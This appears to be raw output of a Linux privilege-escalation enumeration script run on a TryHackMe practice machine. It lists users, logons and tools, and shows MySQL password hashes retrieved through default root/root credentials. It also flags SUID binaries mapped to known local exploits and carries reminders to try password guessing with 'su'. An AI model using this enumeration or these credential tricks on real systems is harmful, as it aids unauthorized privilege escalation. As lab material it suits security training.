uid=1000(tryhackme) gid=1000(tryhackme) groups=1000(tryhackme),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
uid=1001(food) gid=1001(food) groups=1001(food)
uid=1002(pasta) gid=1002(pasta) groups=1002(pasta)
uid=1003(ramen) gid=1003(ramen) groups=1003(ramen)
uid=1004(bread) gid=1004(bread) groups=1004(bread)
uid=100(systemd-network) gid=102(systemd-network) groups=102(systemd-network)
uid=101(systemd-resolve) gid=103(systemd-resolve) groups=103(systemd-resolve)
uid=102(syslog) gid=106(syslog) groups=106(syslog),4(adm)
uid=103(messagebus) gid=107(messagebus) groups=107(messagebus)
uid=104(_apt) gid=65534(nogroup) groups=65534(nogroup)
uid=105(lxd) gid=65534(nogroup) groups=65534(nogroup)
uid=106(uuidd) gid=110(uuidd) groups=110(uuidd)
uid=107(dnsmasq) gid=65534(nogroup) groups=65534(nogroup)
uid=108(landscape) gid=112(landscape) groups=112(landscape)
uid=109(pollinate) gid=1(daemon[0m) groups=1(daemon[0m)
uid=10(uucp) gid=10(uucp) groups=10(uucp)
uid=110(sshd) gid=65534(nogroup) groups=65534(nogroup)
uid=111(telnetd) gid=113(telnetd) groups=113(telnetd),43(utmp)
uid=112(mysql) gid=114(mysql) groups=114(mysql)
uid=13(proxy) gid=13(proxy) groups=13(proxy)
uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
uid=2(bin) gid=2(bin) groups=2(bin)
uid=33(www-data) gid=33(www-data) groups=33(www-data)
uid=34(backup) gid=34(backup) groups=34(backup)
uid=38(list) gid=38(list) groups=38(list)
uid=39(irc) gid=39(irc) groups=39(irc)
uid=3(sys) gid=3(sys) groups=3(sys)
uid=41(gnats) gid=41(gnats) groups=41(gnats)
uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
uid=5(games) gid=60(games) groups=60(games)
uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
uid=6(man) gid=12(man) groups=12(man)
uid=7(lp) gid=7(lp) groups=7(lp)
uid=8(mail) gid=8(mail) groups=8(mail)
uid=9(news) gid=9(news) groups=9(news)

╔══════════╣ Login now
 16:35:49 up 28 min,  0 users,  load average: 0.14, 0.03, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT

╔══════════╣ Last logons
tryhackme pts/1        Thu Mar 19 17:48:10 2020 - Thu Mar 19 17:56:03 2020  (00:07)     192.168.170.128
food     pts/0        Thu Mar 19 17:28:51 2020 - Thu Mar 19 17:56:03 2020  (00:27)     0.0.0.0
tryhackme tty1         Thu Mar 19 17:28:11 2020 - down                      (00:27)     0.0.0.0
reboot   system boot  Thu Mar 19 17:26:22 2020 - Thu Mar 19 17:56:04 2020  (00:29)     0.0.0.0
food     pts/0        Thu Mar 19 17:01:46 2020 - Thu Mar 19 17:26:15 2020  (00:24)     0.0.0.0
food     pts/0        Thu Mar 19 17:01:05 2020 - Thu Mar 19 17:01:40 2020  (00:00)     0.0.0.0
tryhackme tty1         Thu Mar 19 16:54:52 2020 - down                      (00:31)     0.0.0.0
reboot   system boot  Thu Mar 19 16:39:59 2020 - Thu Mar 19 17:26:17 2020  (00:46)     0.0.0.0

wtmp begins Thu Mar 19 16:39:59 2020

╔══════════╣ Last time logon each user
Username         Port     From             Latest
tryhackme        pts/0    10.8.6.110       Mon Apr  6 20:51:01 +0000 2020
food             tty1                      Sat Mar 21 00:20:49 +0000 2020
pasta            tty1                      Sat Mar 21 00:19:06 +0000 2020
ramen            tty1                      Sat Mar 21 00:20:20 +0000 2020
bread            pts/0    10.8.6.110       Mon Apr  6 20:15:37 +0000 2020

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)

╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!



                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════
                             ╚══════════════════════╝
╔══════════╣ Useful software
/usr/bin/base64
/usr/bin/curl
/usr/bin/g++
/usr/bin/gcc
/usr/bin/lxc
/usr/bin/make
/bin/nc
/bin/netcat
/usr/bin/perl
/bin/ping
/usr/bin/python3
/usr/bin/python3.6
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
ii  g++                                   4:7.4.0-1ubuntu2.3                              amd64        GNU C++ compiler
ii  g++-7                                 7.5.0-3ubuntu1~18.04                            amd64        GNU C++ compiler
ii  gcc                                   4:7.4.0-1ubuntu2.3                              amd64        GNU C compiler
ii  gcc-7                                 7.5.0-3ubuntu1~18.04                            amd64        GNU C compiler
/usr/bin/gcc

╔══════════╣ MySQL version
mysql  Ver 14.14 Distrib 5.7.29, for Linux (x86_64) using  EditLine wrapper


═╣ MySQL connection using default root/root ........... Yes
User	Host	authentication_string
root	localhost	*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
mysql.session	localhost	*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
mysql.sys	localhost	*THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE
debian-sys-maint	localhost	*7F52B00E49043951CDA8A01D5FC82F95FEBEC6B8
root	%	*81F5E21E35407D884A6CD4A731AEBFB6AF209E1B
═╣ MySQL connection using root/toor ................... No
═╣ MySQL connection using root/NOPASS ................. No

╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mysql.conf.d/mysqld.cnf' Mysql user: user		= mysql
Found readable /etc/mysql/my.cnf
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mysql.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)

-rw------- 1 root root 317 Mar 19  2020 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Feb 14  2020 /usr/share/doc/rsync/examples/rsyncd.conf
[ftp]
	comment = public archive
	path = /var/www/pub
	use chroot = yes
	lock file = /var/lock/rsyncd
	read only = yes
	list = yes
	uid = nobody
	gid = nogroup
	strict modes = yes
	ignore errors = no
	ignore nonreadable = yes
	transfer logging = no
	timeout = 600
	refuse options = checksum dry-run
	dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'
drwxr-xr-x 2 root root 4096 Mar 20  2020 /etc/ldap


╔══════════╣ Searching ssl/ssh files
ChallengeResponseAuthentication no
UsePAM yes
PasswordAuthentication yes
══╣ Some certificates were found (out limited):
/etc/pollinate/entropy.ubuntu.com.pem
/snap/core/7270/etc/ssl/certs/ACCVRAIZ1.pem
/snap/core/7270/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/snap/core/7270/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/snap/core/7270/etc/ssl/certs/AddTrust_External_Root.pem
/snap/core/7270/etc/ssl/certs/AffirmTrust_Commercial.pem
/snap/core/7270/etc/ssl/certs/AffirmTrust_Networking.pem
/snap/core/7270/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/snap/core/7270/etc/ssl/certs/AffirmTrust_Premium.pem
/snap/core/7270/etc/ssl/certs/Amazon_Root_CA_1.pem
/snap/core/7270/etc/ssl/certs/Amazon_Root_CA_2.pem
/snap/core/7270/etc/ssl/certs/Amazon_Root_CA_3.pem
/snap/core/7270/etc/ssl/certs/Amazon_Root_CA_4.pem
/snap/core/7270/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/snap/core/7270/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/snap/core/7270/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/snap/core/7270/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/snap/core/7270/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/snap/core/7270/etc/ssl/certs/ca-certificates.crt
/snap/core/7270/etc/ssl/certs/CA_Disig_Root_R2.pem
1328PSTORAGE_CERTSBIN

══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem	sftp	/usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow


Searching inside /etc/ssh/ssh_config for interesting info
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Mar 20  2020 /etc/pam.d
-rw-r--r-- 1 root root 2133 Mar  4  2019 /etc/pam.d/sshd




╔══════════╣ Searching tmux sessions
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-shell-sessions
tmux 2.6


/tmp/tmux-1004
╔══════════╣ Analyzing Cloud Init Files (limit 70)
-rw-r--r-- 1 root root 3517 Jan 15  2020 /etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3612 May 15  2019 /snap/core/7270/etc/cloud/cloud.cfg
     lock_passwd: True
-rw-r--r-- 1 root root 3517 Jan 16  2020 /snap/core/8689/etc/cloud/cloud.cfg
     lock_passwd: True

╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 121 Jun 21  2019 /snap/core/7270/usr/share/keyrings
drwxr-xr-x 2 root root 121 Feb 12  2020 /snap/core/8689/usr/share/keyrings
drwxr-xr-x 2 root root 4096 Aug  5  2019 /usr/share/keyrings




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd
passwd file: /etc/passwd
passwd file: /snap/core/7270/etc/pam.d/passwd
passwd file: /snap/core/7270/etc/passwd
passwd file: /snap/core/7270/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/7270/var/lib/extrausers/passwd
passwd file: /snap/core/8689/etc/pam.d/passwd
passwd file: /snap/core/8689/etc/passwd
passwd file: /snap/core/8689/usr/share/bash-completion/completions/passwd
passwd file: /snap/core/8689/var/lib/extrausers/passwd
passwd file: /usr/share/bash-completion/completions/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg
netpgpkeys Not Found
netpgp Not Found

-rw-r--r-- 1 root root 2796 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-archive.gpg
-rw-r--r-- 1 root root 2794 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2012-cdimage.gpg
-rw-r--r-- 1 root root 1733 Sep 17  2018 /etc/apt/trusted.gpg.d/ubuntu-keyring-2018-archive.gpg
-rw-r--r-- 1 root root 13395 Jun 21  2019 /snap/core/7270/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /snap/core/7270/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /snap/core/7270/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /snap/core/7270/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 13395 Feb 12  2020 /snap/core/8689/etc/apt/trusted.gpg
-rw-r--r-- 1 root root 12335 May 19  2012 /snap/core/8689/usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 0 May 19  2012 /snap/core/8689/usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 1227 May 19  2012 /snap/core/8689/usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 3267 Jan 10  2019 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 7399 Sep 17  2018 /usr/share/keyrings/ubuntu-archive-keyring.gpg
-rw-r--r-- 1 root root 6713 Oct 27  2016 /usr/share/keyrings/ubuntu-archive-removed-keys.gpg
-rw-r--r-- 1 root root 4097 Feb  6  2018 /usr/share/keyrings/ubuntu-cloudimage-keyring.gpg
-rw-r--r-- 1 root root 0 Jan 17  2018 /usr/share/keyrings/ubuntu-cloudimage-removed-keys.gpg
-rw-r--r-- 1 root root 2253 Mar 21  2018 /usr/share/keyrings/ubuntu-esm-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-keyring.gpg
-rw-r--r-- 1 root root 1139 Mar 21  2018 /usr/share/keyrings/ubuntu-fips-updates-keyring.gpg
-rw-r--r-- 1 root root 1227 May 27  2010 /usr/share/keyrings/ubuntu-master-keyring.gpg
-rw-r--r-- 1 root root 2867 Feb 22  2018 /usr/share/popularity-contest/debian-popcon.gpg

drwx------ 3 bread bread 4096 Feb 18 16:35 /home/bread/.gnupg
drwx------ 3 food food 4096 Mar 19  2020 /home/food/.gnupg
drwx------ 3 pasta pasta 4096 Mar 21  2020 /home/pasta/.gnupg
drwx------ 3 ramen ramen 4096 Mar 21  2020 /home/ramen/.gnupg
drwx------ 3 tryhackme tryhackme 4096 Mar 19  2020 /home/tryhackme/.gnupg

╔══════════╣ Analyzing Cache Vi Files (limit 70)

-rw------- 1 root root 582 Mar 20  2020 /home/tryhackme/.viminfo


╔══════════╣ Analyzing Postfix Files (limit 70)
-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/7270/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 694 May 18  2016 /snap/core/8689/usr/share/bash-completion/completions/postfix

-rw-r--r-- 1 root root 675 Apr  2  2018 /usr/share/bash-completion/completions/postfix


╔══════════╣ Analyzing Bind Files (limit 70)
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind
-rw-r--r-- 1 root root 856 Apr  2  2018 /usr/share/bash-completion/completions/bind



╔══════════╣ Analyzing Windows Files (limit 70)






















lrwxrwxrwx 1 root root 20 Mar 19  2020 /etc/alternatives/my.cnf -> /etc/mysql/mysql.cnf
lrwxrwxrwx 1 root root 24 Mar 19  2020 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 81 Mar 19  2020 /var/lib/dpkg/alternatives/my.cnf



























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3771 Apr  4  2018 /etc/skel/.bashrc
-rw-r--r-- 1 bread bread 3771 Mar 20  2020 /home/bread/.bashrc
-rw-r--r-- 1 food food 3771 Mar 19  2020 /home/food/.bashrc
-rw-r--r-- 1 pasta pasta 3771 Mar 20  2020 /home/pasta/.bashrc
-rw-r--r-- 1 ramen ramen 3771 Mar 20  2020 /home/ramen/.bashrc
-rw-r--r-- 1 tryhackme tryhackme 3771 Apr  4  2018 /home/tryhackme/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/7270/etc/skel/.bashrc
-rw-r--r-- 1 root root 3771 Aug 31  2015 /snap/core/8689/etc/skel/.bashrc





-rw-r--r-- 1 root root 807 Apr  4  2018 /etc/skel/.profile
-rw-r--r-- 1 bread bread 825 Mar 28  2020 /home/bread/.profile
-rw-r--r-- 1 food food 815 Mar 28  2020 /home/food/.profile
-rw-r--r-- 1 pasta pasta 825 Mar 28  2020 /home/pasta/.profile
-rw-r--r-- 1 ramen ramen 825 Mar 28  2020 /home/ramen/.profile
-rw-r--r-- 1 tryhackme tryhackme 825 Mar 28  2020 /home/tryhackme/.profile
-rw-r--r-- 1 root root 655 May  9  2019 /snap/core/7270/etc/skel/.profile
-rw-r--r-- 1 root root 655 Jul 12  2019 /snap/core/8689/etc/skel/.profile



-rw-r--r-- 1 tryhackme tryhackme 0 Mar 19  2020 /home/tryhackme/.sudo_as_admin_successful



                               ╔═══════════════════╗
═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwsr-xr-x 1 root root 63K Jun 28  2019 /bin/ping
-rwsr-xr-x 1 root root 44K Mar 22  2019 /bin/su
-rwsr-xr-x 1 root root 27K Jan  8  2020 /bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 43K Jan  8  2020 /bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 31K Aug 11  2016 /bin/fusermount
-rwsr-xr-x 1 root root 44K Mar 22  2019 /usr/bin/chsh
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-sr-x 1 root root 2.6M Jun  6  2019 /usr/bin/vim.basic (Unknown SUID binary!)
-rwsr-xr-x 1 root root 59K Mar 22  2019 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 19K Jun 28  2019 /usr/bin/traceroute6.iputils
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 146K Jan 18  2018 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 40K Mar 22  2019 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 37K Mar 22  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 1.6M Mar 20  2020 /usr/bin/screen-4.5.0 (Unknown SUID binary!)
-rwsr-xr-x 1 root root 75K Mar 22  2019 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 427K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 107K Oct 30  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root telnetd 11K Nov  7  2016 /usr/lib/telnetlogin
-rwsr-xr-x 1 root root 10K Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-- 1 root messagebus 42K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 99K Nov 23  2018 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 40K May 15  2019 /snap/core/7270/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/7270/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/7270/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/7270/bin/su
-rwsr-xr-x 1 root root 27K May 15  2019 /snap/core/7270/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/7270/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/7270/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/7270/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/7270/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/7270/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Jun 10  2019 /snap/core/7270/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Jun 10  2019 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Mar  4  2019 /snap/core/7270/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Jun 12  2018 /snap/core/7270/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root root 40K Jan 27  2020 /snap/core/8689/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8689/bin/ping
-rwsr-xr-x 1 root root 44K May  7  2014 /snap/core/8689/bin/ping6
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8689/bin/su
-rwsr-xr-x 1 root root 27K Jan 27  2020 /snap/core/8689/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 71K Mar 25  2019 /snap/core/8689/usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 40K Mar 25  2019 /snap/core/8689/usr/bin/chsh
-rwsr-xr-x 1 root root 74K Mar 25  2019 /snap/core/8689/usr/bin/gpasswd
-rwsr-xr-x 1 root root 39K Mar 25  2019 /snap/core/8689/usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 53K Mar 25  2019 /snap/core/8689/usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 134K Jan 31  2020 /snap/core/8689/usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-- 1 root systemd-resolve 42K Nov 29  2019 /snap/core/8689/usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 419K Mar  4  2019 /snap/core/8689/usr/lib/openssh/ssh-keysign
-rwsr-sr-x 1 root root 105K Feb 12  2020 /snap/core/8689/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwsr-xr-- 1 root dip 386K Jun 12  2018 /snap/core/8689/usr/sbin/pppd  --->  Apple_Mac_OSX_10.4.8(05-2007)

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 34K Feb 27  2019 /sbin/pam_extrausers_chkpwd
-rwsr-sr-x 1 daemon daemon 51K Feb 20  2018 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root mlocate 43K Mar  1  2018 /usr/bin/mlocate
-rwxr-sr-x 1 root tty 14K Jan 17  2018 /usr/bin/bsd-write
-rwxr-sr-x 1 root tty 31K Jan  8  2020 /usr/bin/wall
-rwsr-sr-x 1 root root 2.6M Jun  6  2019 /usr/bin/vim.basic (Unknown SGID binary)
-rwxr-sr-x 1 root shadow 71K Mar 22  2019 /usr/bin/chage
-rwxr-sr-x 1 root shadow 23K Mar 22  2019 /usr/bin/expiry
-rwxr-sr-x 1 root ssh 355K Mar  4  2019 /usr/bin/ssh-agent
-rwxr-sr-x 1 root crontab 39K Nov 16  2017 /usr/bin/crontab
-rwsr-sr-x 1 root root 107K Oct 30  2019 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwxr-sr-x 1 root utmp 10K Mar 11  2016 /usr/lib/x86_64-linux-gnu/utempter/utempter
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/7270/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/7270/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/7270/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/7270/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/7270/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/7270/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/7270/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/7270/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/7270/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Mar  4  2019 /snap/core/7270/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K May 15  2019 /snap/core/7270/usr/bin/wall
-rwsr-sr-x 1 root root 101K Jun 21  2019 /snap/core/7270/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/8689/sbin/pam_extrausers_chkpwd
-rwxr-sr-x 1 root shadow 35K Apr  9  2018 /snap/core/8689/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 61K Mar 25  2019 /snap/core/8689/usr/bin/chage
-rwxr-sr-x 1 root systemd-network 36K Apr  5  2016 /snap/core/8689/usr/bin/crontab
-rwxr-sr-x 1 root mail 15K Dec  7  2013 /snap/core/8689/usr/bin/dotlockfile
-rwxr-sr-x 1 root shadow 23K Mar 25  2019 /snap/core/8689/usr/bin/expiry
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8689/usr/bin/mail-lock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8689/usr/bin/mail-touchlock
-rwxr-sr-x 3 root mail 15K Dec  3  2012 /snap/core/8689/usr/bin/mail-unlock
-rwxr-sr-x 1 root crontab 351K Mar  4  2019 /snap/core/8689/usr/bin/ssh-agent
-rwxr-sr-x 1 root tty 27K Jan 27  2020 /snap/core/8689/usr/bin/wall
-rwsr-sr-x 1 root root 105K Feb 12  2020 /snap/core/8689/usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld-so
/etc/ld.so.conf
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/fakeroot-x86_64-linux-gnu.conf
/usr/lib/x86_64-linux-gnu/libfakeroot
  /etc/ld.so.conf.d/libc.conf
/usr/local/lib
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
/usr/local/lib/x86_64-linux-gnu
/lib/x86_64-linux-gnu
/usr/lib/x86_64-linux-gnu

╔══════════╣ Capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities
Current env capabilities:
Current: =
Current proc capabilities:
CapInh:	0000000000000000
CapPrm:	0000000000000000
CapEff:	0000000000000000
CapBnd:	0000003fffffffff
CapAmb:	0000000000000000

Parent Shell capabilities:
0x0000000000000000=

Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep

╔══════════╣ Users with capabilities
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  3194 Mar 26  2018 sbin.dhclient
-rw-r--r-- 1 root root   125 Nov 23  2018 usr.bin.lxc-start
-rw-r--r-- 1 root root  2857 Apr  7  2018 usr.bin.man
-rw-r--r-- 1 root root 23936 Oct 30  2019 usr.lib.snapd.snap-confine.real
-rw-r--r-- 1 root root  1793 Jan 21  2020 usr.sbin.mysqld
-rw-r--r-- 1 root root  1550 Apr 24  2018 usr.sbin.rsyslogd
-rw-r--r-- 1 root root  1353 Mar 31  2018 usr.sbin.tcpdump

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls
files with acls in searched folders Not Found

╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path
/usr/bin/gettext.sh

╔══════════╣ Executable files potentially added by user (limit 70)
2023-02-18+16:36:04.1473847870 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
2023-02-18+16:36:04.1448430780 /var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
2023-02-18+16:36:04.1422639830 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
2023-02-18+16:36:04.1397537810 /var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
2023-02-18+16:36:04.1373033390 /var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
2023-02-18+16:36:04.1347628970 /var/lib/lxcfs/cgroup/memory/system.slice/img.service/cgroup.event_control
2023-02-18+16:36:04.1322559750 /var/lib/lxcfs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
2023-02-18+16:36:04.1297447870 /var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
2023-02-18+16:36:04.1272032370 /var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
2023-02-18+16:36:04.1245721880 /var/lib/lxcfs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
2023-02-18+16:36:04.1221207530 /var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
